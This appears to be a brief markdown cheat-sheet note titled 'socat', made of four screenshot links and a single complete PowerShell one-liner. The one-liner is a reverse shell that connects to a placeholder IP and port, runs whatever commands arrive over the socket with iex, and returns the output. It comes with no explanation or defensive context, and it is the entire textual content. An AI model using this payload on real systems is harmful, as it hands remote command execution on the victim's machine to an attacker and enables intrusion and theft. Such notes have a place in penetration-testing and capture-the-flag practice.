# socat

<img width="1248" height="761" alt="image" src="https://github.com/user-attachments/assets/743c039e-fd43-41e4-a287-9f8425cd9bb0" />
<img width="1344" height="630" alt="image" src="https://github.com/user-attachments/assets/fdf99409-8101-4612-a881-026ee1960760" />
<img width="1263" height="765" alt="image" src="https://github.com/user-attachments/assets/65386d74-1d00-47a6-b239-437e032e5587" />
<img width="1285" height="869" alt="image" src="https://github.com/user-attachments/assets/f0a5d615-8a97-4341-8c7b-737c7116e10b" />

powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

